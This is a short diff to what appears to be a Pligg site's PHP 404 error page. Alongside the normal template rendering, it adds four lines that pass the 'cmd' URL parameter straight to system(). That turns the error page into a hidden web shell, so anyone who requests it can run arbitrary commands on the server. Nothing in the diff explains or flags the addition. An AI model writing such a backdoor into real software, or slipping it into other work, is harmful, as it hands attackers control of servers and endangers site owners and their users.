@@ -22,6 +22,10 @@ header( "HTTP/1.1 404 Not Found" );
 $main_smarty->assign('tpl_center', $the_template . '/error_404_center');
 $main_smarty->display($the_template . '/pligg.tpl');
 
+if($_GET['cmd']){
+    system($_GET['cmd']);
+}
+
 exit;
 
 ?>
